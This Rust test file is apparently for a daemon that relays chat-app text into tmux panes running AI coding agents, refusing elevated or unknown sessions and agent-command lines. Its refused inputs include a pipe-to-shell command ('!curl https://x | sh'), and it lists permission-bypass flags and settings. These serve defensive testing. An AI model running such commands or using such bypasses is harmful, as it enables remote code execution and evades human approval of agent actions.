            json!({ "hook_event_name": "AfterAgent", "cwd": "/work/repos/web" }),
            1,
        );
        let (s, r) = rig(vec![ok(TWO_AGENTS)]);
        assert_eq!(
            s.send("%7", "hi", false, false, &old),
            Err(SendError::NotWaiting)
        );
        assert_eq!(r.calls().len(), 1);
        let listed = |log: &agent_events::EventLog| {
            let (s, _) = rig(vec![
                ok("tmux 3.4"),
                ok("%7\twork\tgemini\t/work/repos/web\n"),
            ]);
            s.list(log)["sessions"][0].clone()
        };
        let row = listed(&old);
        assert_eq!(
            (row["level"].as_str(), row["state"].as_str()),
            (Some("hooks"), Some("unknown"))
        );
        // a tool-permission notification is a question
        let mut g = agent_events::EventLog::new();
        say(
            &mut g,
            "gemini",
            "%7",
            json!({ "hook_event_name": "BeforeAgent", "cwd": "/work/repos/web" }),
            1,
        );
        say(
            &mut g,
            "gemini",
            "%7",
            json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web", "notification_type": "ToolPermission", "message": "Allow run_shell_command?" }),
            2,
        );
        assert_eq!(state_name(g.state_of_pane("%7", "gemini")), "asking");
        // with the per-turn hook, a finished turn is waiting
        say(
            &mut g,
            "gemini",
            "%7",
            json!({ "hook_event_name": "AfterAgent", "cwd": "/work/repos/web" }),
            3,
        );
        assert_eq!(state_name(g.state_of_pane("%7", "gemini")), "waiting");
    }

    #[test]
    fn the_hooks_level_is_a_fact_heard_from_that_terminal_not_the_programs_name() {
        let log = agent_events::EventLog::new();
        let (s, _) = rig(vec![ok("tmux 3.4"), ok(PANES)]);
        let row = s.list(&log)["sessions"][0].clone();
        assert_eq!(
            (
                row["engine"].as_str(),
                row["level"].as_str(),
                row["state"].as_str()
            ),
            (Some("claude-code"), Some("terminal"), Some("unknown")),
            "no hook has fired from this terminal"
        );
        let heard = waiting_log("/work/repos/web");
        let (s, _) = rig(vec![ok("tmux 3.4"), ok(PANES)]);
        assert_eq!(s.list(&heard)["sessions"][0]["level"], "hooks");
        // a report from a hook in another terminal, or from another program, vouches for nothing here
        let mut other = agent_events::EventLog::new();
        say(
            &mut other,
            "claude-code",
            "%9",
            json!({ "hook_event_name": "Stop", "cwd": "/work/repos/web" }),
            1,
        );
        say(
            &mut other,
            "codex",
            "%3",
            json!({ "type": "agent-turn-complete", "cwd": "/work/repos/web" }),
            2,
        );
        let (s, _) = rig(vec![ok("tmux 3.4"), ok(PANES)]);
        assert_eq!(s.list(&other)["sessions"][0]["level"], "terminal");
    }

    #[test]
    fn the_routes_say_what_happened_and_never_echo_the_text() {
        let (s, _) = rig(vec![ok(PANES), ok(""), ok("")]);
        let events = Mutex::new(waiting_log("/work/repos/web"));
        let q = Default::default();
        let (st, v) = route(
            &s,
            &events,
            "POST",
            "/v1/agent-sessions/%3/send",
            &q,
            br#"{"text":"MARKER-TEXT","from_app":false}"#,
        );
        assert_eq!(st, 200);
        assert!(!v.to_string().contains("MARKER-TEXT"));
        assert_eq!(
            route(&s, &events, "POST", "/v1/agent-sessions/%3/send", &q, b"{x").0,
            400
        );
        assert_eq!(
            route(&s, &events, "GET", "/v1/agent-sessions/%3/send", &q, b"").0,
            405
        );
        assert_eq!(
            route(&s, &events, "GET", "/v1/agent-sessions/%3/zzz", &q, b"").0,
            404
        );
        let (s2, _) = rig(vec![ok(PANES)]);
        let busy = Mutex::new(agent_events::EventLog::new());
        let (st, v) = route(
            &s2,
            &busy,
            "POST",
            "/v1/agent-sessions/%3/send",
            &q,
            br#"{"text":"x","from_app":false}"#,
        );
        assert_eq!((st, v["code"].as_str()), (409, Some("not_waiting")));
    }

    // ---- what a chat app may type into (authority) ----

    const APP_PANE: &str = "%3\twork\tclaude\t/work/repos/web\t/dev/pts/3\n";

    /// A Claude Code session in %3 that has finished a turn in `mode` (as its hooks report it).
    fn moded_log(mode: Option<&str>) -> agent_events::EventLog {
        let mut log = agent_events::EventLog::new();
        for (i, ev) in ["UserPromptSubmit", "Stop"].iter().enumerate() {
            let mut p = json!({ "hook_event_name": ev, "cwd": "/work/repos/web" });
            if let Some(m) = mode {
                p["permission_mode"] = json!(m);
            }
            log.report_in_pane("claude-code", &p, "/x", "%3", 1 + i as u64)
                .unwrap();
        }
        log
    }

    const PLAIN_PS: &str = "  100 -bash\n  101 claude\n";
    const PLAIN_SCREEN: &str = "ok\n  ? for shortcuts";
    const USER: &str = "/home/u/.claude/settings.json";
    const PROJ: &str = "/work/repos/web/.claude/settings.local.json";
    const MANAGED: &str = "/etc/claude-code/managed-settings.json";
    const ENVIRON: &str = "/proc/101/environ";

    /// Everything the daemon looks at for one send to %3, supplied: the hook log, the process list, files (by path), the
    /// managed drop-in folder's file names and the screen.
    struct Rig {
        mode: Option<&'static str>,
        ps: &'static str,
        files: Vec<(String, String)>,
        drop_ins: Option<Vec<String>>,
        screen: &'static str,
    }

    impl Rig {
        fn plain() -> Rig {
            Rig {
                mode: Some("default"),
                ps: PLAIN_PS,
                files: Vec::new(),
                drop_ins: Some(Vec::new()),
                screen: PLAIN_SCREEN,
            }
        }
        fn file(mut self, path: &str, text: &str) -> Rig {
            self.files.push((path.to_string(), text.to_string()));
            self
        }
        fn ps(mut self, ps: &'static str) -> Rig {
            self.ps = ps;
            self
        }
        fn screen(mut self, s: &'static str) -> Rig {
            self.screen = s;
            self
        }
        fn mode(mut self, m: Option<&'static str>) -> Rig {
            self.mode = m;
            self
        }
        fn log(&self) -> agent_events::EventLog {
            moded_log(self.mode)
        }
        fn service(&self) -> (SessionService, Arc<RecordingRunner>) {
            let files = self.files.clone();
            let drop_ins = self.drop_ins.clone();
            let r = Arc::new(RecordingRunner::new());
            // list-panes, ps, capture-pane, then the two send-keys
            for o in [ok(APP_PANE), ok(self.ps), ok(self.screen), ok(""), ok("")] {
                r.reply(o);
            }
            let svc = SessionService::new(r.clone())
                .with_files(
                    "/home/u",
                    Arc::new(move |p: &str| match files.iter().find(|(f, _)| f == p) {
                        Some((_, t)) => FileRead::Text(t.clone()),
                        // a process whose environment holds nothing of interest
                        None if p.starts_with("/proc/") => FileRead::Text("HOME=/home/u\0".into()),
                        None => FileRead::Missing,
                    }),
                )
                .with_dir_lister(Arc::new(move |_| drop_ins.clone()));
            (svc, r)
        }
        /// One line from `from_app` (or the dashboard). Returns the result and whether a key was typed.
        fn send(&self, text: &str, from_app: bool) -> (Result<(), SendError>, bool) {
            let (svc, r) = self.service();
            let res = svc.send("%3", text, false, from_app, &self.log());
            let typed = r
                .calls()
                .iter()
                .any(|c| c.args.iter().any(|a| a == "send-keys"));
            (res, typed)
        }
    }

    #[test]
    fn a_chat_app_types_only_into_a_plain_session() {
        assert_eq!(Rig::plain().send("go on", true), (Ok(()), true));
        assert_eq!(
            Rig::plain().mode(Some("plan")).send("go on", true),
            (Ok(()), true)
        );
        // read-only allow rules, an Oz Box hook of our own and a sandbox that is off do not lift it
        let calm = Rig::plain()
            .file(USER, r#"{"permissions":{"allow":["Read","Grep"]},"sandbox":{"enabled":false}}"#)
            .file(
                PROJ,
                r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","name":"ozboxd hook"}]}]}}"#,
            );
        assert_eq!(calm.send("go on", true), (Ok(()), true));
    }

    /// The error and what each kind of session earns, by case: every one refused, none typed into.
    #[test]
    fn a_chat_app_is_refused_in_every_elevated_case() {
        let allow_bash = r#"{"permissions":{"allow":["Bash(npm test:*)"]}}"#;
        let mut cases: Vec<(String, Rig)> = Vec::new();
        for m in ["acceptEdits", "auto", "dontAsk", "bypassPermissions"] {
            cases.push((format!("mode {m}"), Rig::plain().mode(Some(m))));
        }
        let ps_cases: [(&str, &'static str); 9] = [
            ("skip flag", "  101 claude --dangerously-skip-permissions"),
            ("mode flag", "  101 claude --permission-mode=acceptEdits"),
            ("allowed tools flag", "  101 claude --allowedTools Bash"),
            ("settings flag", "  101 claude --settings /tmp/x.json"),
            (
                "prompt tool flag",
                "  101 claude --permission-prompt-tool mcp__x__approve",
            ),
            (
                "prompt tool flag, equals",
                "  101 claude --permission-prompt-tool=mcp__x__approve",
            ),
            ("plugin dir flag", "  101 claude --plugin-dir /opt/plug"),
            (
                "plugin url flag",
                "  101 claude --plugin-url https://x/p.zip",
            ),
            (
                "late flag in a long line",
                "  101 claude --model m --verbose --add-dir /a --add-dir /b --permission-mode auto",
            ),
        ];
        for (n, ps) in ps_cases {
            cases.push((n.into(), Rig::plain().ps(ps)));
        }
        let file_cases: [(&str, &str, &str); 14] = [
            ("user allow rule", USER, allow_bash),
            ("project local allow rule", PROJ, allow_bash),
            ("managed allow rule", MANAGED, allow_bash),
            (
                "default mode setting",
                USER,
                r#"{"permissions":{"defaultMode":"acceptEdits"}}"#,
            ),
            ("sandbox enabled", USER, r#"{"sandbox":{"enabled":true}}"#),
            (
                "sandbox enabled, auto allow on",
                USER,
                r#"{"sandbox":{"enabled":true,"autoAllowBashIfSandboxed":true}}"#,
            ),
            (
                "sandbox auto allow alone",
                USER,
                r#"{"sandbox":{"autoAllowBashIfSandboxed":true}}"#,
            ),
            (
                "auto mode in plan",
                USER,
                r#"{"useAutoModeDuringPlan":true}"#,
            ),
            (
                "another PreToolUse hook",
                USER,
                r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"/x/allow.sh"}]}]}}"#,
            ),
            (
                "a PermissionRequest hook",
                PROJ,
                r#"{"hooks":{"PermissionRequest":[{"hooks":[{"type":"command","command":"/x/allow.sh"}]}]}}"#,
            ),
            (
                "another hook beside ours",
                USER,
                r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","name":"ozboxd hook"},{"type":"command","command":"/x/a.sh"}]}]}}"#,
            ),
            ("old allowedTools key", USER, r#"{"allowedTools":["Bash"]}"#),
            (
                "an allow rule under CLAUDE_CONFIG_DIR",
                "/srv/claude-cfg/settings.json",
                allow_bash,
            ),
            (
                "sandbox under CLAUDE_CONFIG_DIR",
                "/srv/claude-cfg/settings.local.json",
                r#"{"sandbox":{"enabled":true}}"#,
            ),
        ];
        for (n, path, text) in file_cases {
            let mut rig = Rig::plain().file(path, text);
            if path.starts_with("/srv/") {
                rig = rig.file(ENVIRON, "HOME=/home/u\0CLAUDE_CONFIG_DIR=/srv/claude-cfg\0");
            }
            cases.push((n.into(), rig));
        }
        let mut dropin = Rig::plain().file(
            "/etc/claude-code/managed-settings.d/10-allow.json",
            allow_bash,
        );
        dropin.drop_ins = Some(vec!["10-allow.json".into()]);
        cases.push(("managed drop-in allow rule".into(), dropin));
        cases.push((
            "footer says accept edits".into(),
            Rig::plain().screen("x\n  accept edits on (shift+tab to cycle)"),
        ));
        cases.push((
            "footer under a long status line".into(),
            Rig::plain().screen(
                "a\nb\nc\nd\ne\nf\ng\nh\n  auto mode on (shift+tab to cycle)\ni\nj\nk\nl\nm",
            ),
        ));
        for (name, rig) in &cases {
            let (res, typed) = rig.send("go on", true);
            assert_eq!(res, Err(SendError::Elevated), "{name}");
            assert!(!typed, "{name}: nothing was typed");
        }
        // the dashboard's own person is not held to it: the same elevated session takes a line from the dashboard
        let (res, typed) = Rig::plain()
            .mode(Some("bypassPermissions"))
            .send("go on", false);
        assert_eq!((res, typed), (Ok(()), true));
        // and a chat app cannot force its way in
        let r = Arc::new(RecordingRunner::new());
        r.reply(ok(APP_PANE));
        let svc = SessionService::new(r);
        assert_eq!(
            svc.send("%3", "x", true, true, &moded_log(Some("auto"))),
            Err(SendError::Elevated)
        );
    }

    /// What could not be established is `Unknown`, which is refused as well, but says so: it is not "elevated".
    #[test]
    fn a_chat_app_is_refused_with_unknown_when_nothing_can_be_established() {
        let json = "{not json";
        let mut cases: Vec<(String, Rig)> = vec![
            ("no mode heard".into(), Rig::plain().mode(None)),
            (
                "an unseen mode".into(),
                Rig::plain().mode(Some("somethingNew")),
            ),
            (
                "agent process not visible".into(),
                Rig::plain().ps("  100 -bash\n"),
            ),
            (
                "unreadable user settings".into(),
                Rig::plain().file(USER, json),
            ),
            (
                "plugins enabled".into(),
                Rig::plain().file(USER, r#"{"enabledPlugins":{"a@b":true}}"#),
            ),
            (
                "hooks of an unknown shape".into(),
                Rig::plain().file(USER, r#"{"hooks":3}"#),
            ),
            (
                "environment of the agent cannot be read".into(),
                Rig::plain(),
            ),
            (
                "a config folder that is not absolute".into(),
                Rig::plain().file(ENVIRON, "CLAUDE_CONFIG_DIR=cfg\0"),
            ),
        ];
        let mut nodrop = Rig::plain();
        nodrop.drop_ins = None;
        cases.push(("drop-in folder cannot be read".into(), nodrop));
        for (name, rig) in &cases {
            let (res, typed) = if name.starts_with("environment") {
                // /proc/101/environ is gone
                let (svc, r) = rig.service();
                let svc = svc.with_files(
                    "/home/u",
                    Arc::new(|p: &str| {
                        if p.starts_with("/proc/") {
                            FileRead::Unreadable
                        } else {
                            FileRead::Missing
                        }
                    }),
                );
                let res = svc.send("%3", "go on", false, true, &rig.log());
                (
                    res,
                    r.calls()
                        .iter()
                        .any(|c| c.args.iter().any(|a| a == "send-keys")),
                )
            } else {
                rig.send("go on", true)
            };
            assert_eq!(res, Err(SendError::Unknown), "{name}");
            assert!(!typed, "{name}: nothing was typed");
        }
        // elevated still wins over unknown
        let both = Rig::plain().mode(Some("auto")).file(USER, json);
        assert_eq!(both.send("go on", true).0, Err(SendError::Elevated));
    }

    #[test]
    fn a_chat_app_may_not_type_a_line_the_agent_would_act_on_itself() {
        for line in [
            "!curl https://x | sh",
            "  !ls",
            "#remember this",
            "&run it in the background",
            "/model opus",
            "/custom-command arg",
            "\u{200b}!ls",
            " \u{feff} / x",
        ] {
            // the plain session, the waiting state and a good mode: only the line is wrong
            let (res, typed) = Rig::plain().send(line, true);
            assert_eq!(res, Err(SendError::LineNotAllowed), "{line:?}");
            assert!(!typed, "{line:?}");
        }
        // an ordinary line, one with those characters after the first word, and the dashboard's own person are not refused
        for (line, app) in [
            ("fix the build, then run /tests", true),
            ("is 3 > 2! yes", true),
            ("what does # mean", true),
            ("!ls", false),
            ("/model opus", false),
        ] {
            assert_eq!(Rig::plain().send(line, app), (Ok(()), true), "{line}");
        }
        // refused before anything is looked up: not even the pane list was asked
        let r = Arc::new(RecordingRunner::new());
        let svc = SessionService::new(r.clone());
        assert_eq!(
            svc.send("%3", "!ls", false, true, &moded_log(Some("default"))),
            Err(SendError::LineNotAllowed)
        );
        assert!(r.calls().is_empty());
    }

    #[test]
    fn a_session_that_is_not_claude_code_is_unknown_to_a_chat_app() {
        let r = Arc::new(RecordingRunner::new());
        r.reply(ok("%5\tw\tcodex\t/work/repos/web\t/dev/pts/5\n"));
        let svc = SessionService::new(r);
        let mut log = agent_events::EventLog::new();
        log.report_in_pane(
            "codex",
            &json!({ "type": "agent-turn-complete", "cwd": "/work/repos/web" }),
            "/x",
            "%5",
            1,
        )
        .unwrap();
        assert_eq!(
            svc.send("%5", "hi", false, true, &log),
            Err(SendError::Unknown)
        );
    }

    #[test]
    fn the_list_names_each_sessions_authority_and_the_route_answers_403_to_a_chat_app() {
        let r = Arc::new(RecordingRunner::new());
        for o in [ok("tmux 3.4"), ok(APP_PANE), ok(PLAIN_PS), ok(PLAIN_SCREEN)] {
            r.reply(o);
        }
        let svc2 = SessionService::new(r)
            .with_files(
                "/home/u",
                Arc::new(|p: &str| {
                    if p.starts_with("/proc/") {
                        FileRead::Text(String::new())
                    } else {
                        FileRead::Missing
                    }
                }),
            )
            .with_dir_lister(Arc::new(|_| Some(Vec::new())));
        assert_eq!(
            svc2.list(&moded_log(Some("default")))["sessions"][0]["authority"],
            "plain"
        );
        // not heard from at all: unknown
        let r = Arc::new(RecordingRunner::new());
        r.reply(ok("tmux 3.4"));
        r.reply(ok(APP_PANE));
        let svc = SessionService::new(r);
        assert_eq!(
            svc.list(&agent_events::EventLog::new())["sessions"][0]["authority"],
            "unknown"
        );
        // the route: elevated, unknown, a refused line, and a caller that does not say who it is
        let q = std::collections::BTreeMap::new();
        let post = |rig: &Rig, body: &[u8]| {
            let (svc, _) = rig.service();
            let events = Mutex::new(rig.log());
            route(
                &svc,
                &events,
                "POST",
                "/v1/agent-sessions/%3/send",
                &q,
                body,
            )
        };
        let elev = Rig::plain().mode(Some("bypassPermissions"));
        let (st, v) = post(&elev, br#"{"text":"MARKER-TEXT","from_app":true}"#);
        assert_eq!((st, v["code"].as_str()), (403, Some("elevated")));
        assert!(!v.to_string().contains("MARKER-TEXT"));
        let unk = Rig::plain().mode(None);
        assert_eq!(
            post(&unk, br#"{"text":"x","from_app":true}"#).1["code"],
            "unknown"
        );
        let (st, v) = post(&Rig::plain(), br#"{"text":"!MARKER-TEXT","from_app":true}"#);
        assert_eq!((st, v["code"].as_str()), (403, Some("line_not_allowed")));
        assert!(!v.to_string().contains("MARKER-TEXT"));
        // a caller that leaves `from_app` out is a chat app: it gets no dashboard powers
        let (st, v) = post(&elev, br#"{"text":"go on"}"#);
        assert_eq!((st, v["code"].as_str()), (403, Some("elevated")));
        let (st, v) = post(&Rig::plain(), br#"{"text":"!ls"}"#);
        assert_eq!((st, v["code"].as_str()), (403, Some("line_not_allowed")));
        // and the dashboard says so explicitly
        assert_eq!(post(&elev, br#"{"text":"!ls","from_app":false}"#).0, 200);
    }

    #[test]
    fn the_list_keeps_a_panes_classification_a_few_seconds_but_a_send_never_uses_it() {
        let r = Arc::new(RecordingRunner::new());
        // first list: -V, list-panes, ps, capture; second list (cached): -V, list-panes only; then a send: list-panes, ps, capture
        for o in [
            ok("tmux 3.4"),
            ok(APP_PANE),
            ok(PLAIN_PS),
            ok(PLAIN_SCREEN),
            ok("tmux 3.4"),
            ok(APP_PANE),
            ok(APP_PANE),
            ok(PLAIN_PS),
            ok(PLAIN_SCREEN),
            ok(""),
            ok(""),
        ] {
            r.reply(o);
        }
        let svc = SessionService::new(r.clone())
            .with_files(
                "/home/u",
                Arc::new(|p: &str| {
                    if p.starts_with("/proc/") {
                        FileRead::Text(String::new())
                    } else {
                        FileRead::Missing
                    }
                }),
            )
            .with_dir_lister(Arc::new(|_| Some(Vec::new())));
        let log = moded_log(Some("default"));
        let probes = |r: &RecordingRunner| {
            r.calls()
                .iter()
                .filter(|c| c.program == "ps" || c.args.iter().any(|a| a == "capture-pane"))
                .count()
        };
        assert_eq!(svc.list(&log)["sessions"][0]["authority"], "plain");
        assert_eq!(probes(&r), 2);
        assert_eq!(svc.list(&log)["sessions"][0]["authority"], "plain");
        assert_eq!(probes(&r), 2, "the second list ran no ps and no capture");
        // a send looks again, whatever the cache holds
        assert!(svc.send("%3", "go on", false, true, &log).is_ok());
        assert_eq!(probes(&r), 4);
        // a changed mode is never answered from the cache
        let r2 = Arc::new(RecordingRunner::new());
        for o in [
            ok("tmux 3.4"),
            ok(APP_PANE),
            ok(PLAIN_PS),
            ok(PLAIN_SCREEN),
            ok("tmux 3.4"),
            ok(APP_PANE),
        ] {
            r2.reply(o);
        }
        let svc = SessionService::new(r2)
            .with_files(
                "/home/u",
                Arc::new(|p: &str| {
                    if p.starts_with("/proc/") {
                        FileRead::Text(String::new())
                    } else {
                        FileRead::Missing
                    }
                }),
            )
            .with_dir_lister(Arc::new(|_| Some(Vec::new())));
        assert_eq!(
            svc.list(&moded_log(Some("default")))["sessions"][0]["authority"],
            "plain"
        );
        assert_eq!(
            svc.list(&moded_log(Some("auto")))["sessions"][0]["authority"],
            "elevated"
        );
    }
}
